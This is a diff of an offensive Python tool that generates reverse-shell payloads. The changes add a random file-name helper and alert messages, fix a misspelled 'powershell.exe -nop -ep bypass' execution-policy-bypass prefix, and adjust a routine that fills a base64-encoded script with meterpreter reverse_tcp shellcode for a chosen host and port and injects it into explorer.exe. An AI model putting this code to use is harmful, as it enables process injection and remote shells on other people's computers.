@@ -4,7 +4,15 @@ from binary import shellcode_to_ps1, WINDOWS_BLOODSEEKER_SCRIPT # imported since
 from sys import exit
 import platform
 import os
+import string
 
+def generate_file_name(extension=""):
+    file_name = ""
+    while len(file_name) < 8:
+        random_char = os.urandom(1)
+        if random_char in string.letters:
+            file_name += random_char
+    return file_name + extension
 
 class OperationalSystem(object):
     def __init__(self):
@@ -25,6 +33,13 @@ def error(msg):
         msg = "[\033[091m!\033[0m] {0}".format(msg)
     else:
         msg = "[!] {0}".format(msg)
+    return msg
+
+def alert(msg):
+    if SysOS.OS == "linux":
+        msg = "[\033[093mALERT\033[0m] {0}".format(msg)
+    else:
+        msg = "[ALERT] {0}".format(msg)
     return msg
 #=================
 
@@ -65,7 +80,7 @@ def base64_wrapper(name, code, args,shell="/bin/bash"):
             if "-Command" in code:
                 prefix, xcode = code.split("-Command")
             else:
-                prefix = "poweshell.exe -nop -ep bypass "
+                prefix = "powershell.exe -nop -ep bypass "
                 xcode = code
             
             pcode = xcode.replace("'", "") # Remove single quotes from -Command
@@ -132,8 +147,9 @@ class ReverseShell(object):
                 print(info("Generating shellcode ..."))
                 malicious_script = str(WINDOWS_BLOODSEEKER_SCRIPT.decode("base64")).replace("SHELLCODEHERE", shellcode_to_ps1("windows/x64/meterpreter/reverse_tcp", self.args.host, self.args.port))
                 self.code = malicious_script.replace("PROCESSNAME", "explorer") # we want inject into explorer.exe
-                print(info("Make sure you have a handler for windows/x64/meterpreter/reverse_tcp listening."))
-
+                print(alert("Make sure you have a handler for windows/x64/meterpreter/reverse_tcp listening in your machine."))
+                print(alert("It is recommended to use the --base64 flag."))
+                return self.code # we dont need encoder in this one.
             else:
                 print(error("No custom shell procedure was arranged for this shell. This is fatal."))
                 exit(1)
